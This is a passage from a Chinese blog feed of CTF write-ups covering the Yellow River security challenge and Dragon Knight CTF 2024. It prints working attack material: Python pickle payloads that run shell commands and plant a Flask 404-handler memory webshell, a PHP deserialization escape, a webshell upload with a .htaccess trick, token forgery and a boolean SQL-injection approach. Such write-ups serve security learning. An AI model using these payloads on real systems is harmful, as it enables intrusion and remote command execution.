        <content type="html"><![CDATA[<h1 id="第二届黄河流域安全技能挑战赛复现"><a href="#第二届黄河流域安全技能挑战赛复现" class="headerlink" title="第二届黄河流域安全技能挑战赛复现"></a>第二届黄河流域安全技能挑战赛复现</h1><p>题目还挺不错的, 但是赛中没做, 这里看wp复现一下</p><p>膜拜大师傅wp <a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><h2 id="myfavorPython"><a href="#myfavorPython" class="headerlink" title="myfavorPython"></a>myfavorPython</h2><p>随便传一个opcode会发现并不是反序列化执行了, 而是用pickletools.dis, 一眼看出来了,但是以为这里还以为可以注入, 没想到这里其实是flask开了debug模式 直接构造报错就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Python-revenge"><a href="#Python-revenge" class="headerlink" title="Python-revenge"></a>Python-revenge</h2><p>这个也是在gxngxngxn师傅对python内存马的研究orz</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><p>之后随便打开一个404页面就可以命令执行</p><h2 id="逃跑大师"><a href="#逃跑大师" class="headerlink" title="逃跑大师"></a>逃跑大师</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$A</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span> = <span class="string">&quot;HELLO&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$C</span> = <span class="string">&quot;!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$A</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;A = <span class="variable">$A</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$this</span>-&gt;B . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$this</span>-&gt;C . <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$Class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>]);</span><br><span class="line">    <span class="variable">$Key</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Class</span>);</span><br><span class="line">    <span class="variable">$K</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;SDPCSEC&quot;</span>, <span class="string">&quot;SanDieg0&quot;</span>, <span class="variable">$Key</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$K</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察mb_strpos与mb_substr执行差异导致的漏洞</p><p>这里我也测试了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$data</span>[<span class="variable">$start</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> ;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span> . <span class="string">&#x27; &#x27;</span> .  <span class="variable">$data</span>[<span class="variable">$end</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="number">0</span>] . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$_GET</span>[<span class="number">1</span>] . <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>;</span><br></pre></td></tr></table></figure><p>首先是<code>%9f</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515184216748.png" alt="image-20240515184216748"></p><p>可以看见这里的mb_strpos是直接忽略了<code>%9f</code>这个不可见字符, 而mb_substr并没有忽略, 而是正常处理, 这导致返回的字符整体向前移了一位</p><p>再来看<code>%f0</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515193637458.png" alt="image-20240515193637458"></p><p>这里mb_strpos是正常识别的, mb_substr把<code>%f0</code> 连着后面的三个字符识别成了一个字符</p><p>在mb_substr看来, 第0个字符是<code>%f0[we</code> , 第一个字符是<code>l</code> , 然后连着输出了后面21个字符</p><p>因此,<code>%9f</code>用来增加一个字符，<code>%f0</code>用来减少三个字符，我们利用这个特性，可以实现任意字符的构造</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515201303695.png" alt="image-20240515201303695"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515202049157.png" alt="image-20240515202049157"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Dragon Knight CTF 2024</title>
      <link href="/2024/05/30/Dragon-Knight-CTF-2024/"/>
      <url>/2024/05/30/Dragon-Knight-CTF-2024/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>直接扫码</p><h2 id="神秘文字"><a href="#神秘文字" class="headerlink" title="神秘文字"></a>神秘文字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𓅂=+![];𓂀=+!𓅂;𓁄=𓂀+𓂀;𓊎=𓁄+𓂀;𓆣=𓁄*𓁄;𓊝=𓊎+𓁄;𓆫=𓁄*𓊎;𓅬=𓆣+𓊎;[𓇎,𓏢,𓆗,𓃠,𓃀,𓋌,𓏁,𓇲,𓁣,𓁺,𓏁,𓇲,𓆦,𓏁,𓁣,𓇲,𓄬,𓇲,𓁣,𓏁,𓋌,𓁣,𓇲,𓏁,𓋌,𓇲]=(𓆡=&#x27;\\&quot;&#x27;)+!!𓆡+!𓆡+𓆡.𓆡+&#123;&#125;;𓆉=𓇲+𓁣+𓆦+𓁺+𓆗+𓃠+𓃀+𓇲+𓆗+𓁣+𓃠,𓆉=𓆉[𓆉][𓆉],𓄦=𓏁+𓁣+𓄬+𓆦,𓄀=𓃠+𓋌+𓆗+𓃀+𓃠+𓆦+&quot; &quot;;𓆉(𓆉(𓄀+𓏢+𓆉(𓄀+[...&quot;𓇎𓂀𓅂𓅬𓇎𓂀𓂀𓅬𓇎𓂀𓂀𓅬𓇎𓂀𓅂𓆣𓇎𓆣𓂀𓇎𓂀𓊎𓂀𓇎𓂀𓂀𓅬𓇎𓂀𓁄𓊝𓇎𓂀𓆫𓁄𓇎𓆣𓅂𓇎𓂀𓆫𓅂𓇎𓂀𓅂𓂀𓇎𓂀𓆫𓊎𓇎𓂀𓆫𓊎𓇎𓂀𓁄𓅬𓇎𓂀𓊝𓅬𓇎𓂀𓆫𓁄𓇎𓂀𓆣𓆣𓇎𓆣𓅂𓇎𓂀𓊝𓂀𓇎𓂀𓆫𓊎𓇎𓅬𓁄𓇎𓂀𓊝𓊝𓇎𓂀𓅂𓂀𓇎𓂀𓆫𓁄𓇎𓂀𓆫𓆣𓇎𓆫𓂀𓇎𓂀𓂀𓆫𓇎𓂀𓊎𓅬𓇎𓂀𓂀𓊎𓇎𓆫𓂀𓇎𓂀𓅂𓊝𓇎𓂀𓁄𓅂𓇎𓂀𓆫𓅂𓇎𓆫𓊎&quot;][𓄦]`+`)``+𓏢)``)``</span><br></pre></td></tr></table></figure><p>一眼jsFuck</p><p>放到本地node环境运行</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526202432238.png" alt="image-20240526202432238" /><p>拿到压缩包密码 mArt1N_K1EPp3</p><p>DRKCTF{D0_Y0u_KnOw_Wh0_Creat3_J5Fu*K?}</p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="羡慕群友每一天"><a href="#羡慕群友每一天" class="headerlink" title="羡慕群友每一天"></a>羡慕群友每一天</h2><p>谷歌识图直接可以识别到这个视频， 和图片里的摩天轮一模一样</p><p><a href="https://www.youtube.com/watch?app=desktop&v=2JY1s5UysPk&ab_channel=ActionKid">https://www.youtube.com/watch?app=desktop&amp;v=2JY1s5UysPk&amp;ab_channel=ActionKid</a></p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143303296.png" alt="image-20240525143303296" /><p>去谷歌地图找到精确位置</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143102076.png" alt="image-20240525143102076" /><p>DRKCTF{美国-佛罗里达州-迈阿密市-Skyviews}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezsign"><a href="#ezsign" class="headerlink" title="ezsign"></a>ezsign</h2><p>进去之后是一个登录，admin&#x2F;admin</p><p>是一个前端的留言板， 没什么用</p><p>扫描一下目录</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526190725821.png" alt="image-20240526190725821" /><p> 可以看见还是能扫描出来很多东西，包括.DS_Store</p><p>github上随便找一个利用的.DS_Store工具， 我这里用的是ds_store_exp</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526193540195.png" alt="image-20240526193540195" /><p>主要看这个index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查 cookie 中是否有 token</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$token</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$token</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$token</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$isLocal</span> = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$isLocal</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome Back，&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        <span class="comment">//如果 upload 目录下存在$username.png文件，则显示图片</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">// 显示图片，缩小图片</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>] .<span class="string">&#x27;&quot; width=&quot;200&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;请上传您高贵的头像。&#x27;</span>;</span><br><span class="line">            <span class="comment">// 写一个上传头像的功能</span></span><br><span class="line">            <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">            &lt;form method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            EOD</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// echo &quot;留个言吧&quot;;</span></span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">        &lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;input-text&quot;&gt;Enter some text:&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; id=&quot;input-text&quot; placeholder=&quot;Type here...&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick=&quot;displayInput()&quot;&gt;Display&lt;/button&gt;</span></span><br><span class="line"><span class="string">        EOD</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Login&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; action=&quot;./login.php&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">displayInput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> inputText = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;input-text&quot;</span>).value;</span><br><span class="line">      document.<span class="title function_ invoke__">write</span>(inputText)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>里面有一个上传文件的功能点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;upload.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload&quot;</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br></pre></td></tr></table></figure><p>要进入这个功能点需要满足 <code>$isLocal</code>为真</p><p>注意到这个<code>extract($_GET);</code></p><p>可以通过get传参直接去覆盖$_SERVER[‘REMOTE_ADDR’]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是其实这里也完全没必要, 直接给把那段上传的html代码粘贴到网站里给upload.php上传文件就行, 这里我们正常做</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194419508.png" alt="image-20240526194419508" /><p>这里上传一个php木马, 直接去upload目录下访问是不会解析的, 原因未知, 一开始猜测是用了file_get_contents, 但是当我尝试传了一个.htaccess再访问时发现403了</p><p>那么构造.htaccess把png解析成php</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194928431.png" alt="image-20240526194928431" /><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195805665.png" alt="image-20240526195805665" /><p>之后yijian连接即可</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195921876.png" alt="image-20240526195921876" /><h2 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a>EzLogin</h2><p>进去看网站源码有一个提示&#x2F;register.html 可以注册用户</p><p>先随便注册一个账号 abc&#x2F;123, 去登录得到一个cookie, 并且提示我们不是admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65794a3163325679626d46745a534936496d46695979497349434a306232746c62694936496a6b774d4445314d446b344d324e6b4d6a526d596a426b4e6a6b324d3259335a4449345a5445335a6a637949697767496d6c7a5832466b62576c75496a6f7766513d3d</span><br></pre></td></tr></table></figure><p>一眼hex, 后面还有一层base64</p><p>解码后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;abc&quot;, &quot;token&quot;:&quot;900150983cd24fb0d6963f7d28e17f72&quot;, &quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>修改这个is_admin为1再访问, 这次会回显我们的密码, 当我们为伪造token中的username为admin会被检测到</p><p>再看这个token,很像md5</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526201250853.png" alt="image-20240526201250853" /><p>这个就是账号的md5</p><p>这里比较坑就在于你的username必须足够简单不然发现不了这个</p><p>那么就可以更改username和md5来伪造token了</p><p>手搓很麻烦 , 写个脚本测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br></pre></td></tr></table></figure><p>大概这样两个函数即可</p><p>之后会发现username其实有一个sql注入 布尔注入</p><p>过滤了空格 <code>&gt;</code> <code>&lt;</code> <code>between and</code>  </p><p>很难二分, 好在服务器比较快, 直接爆了</p><p>贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 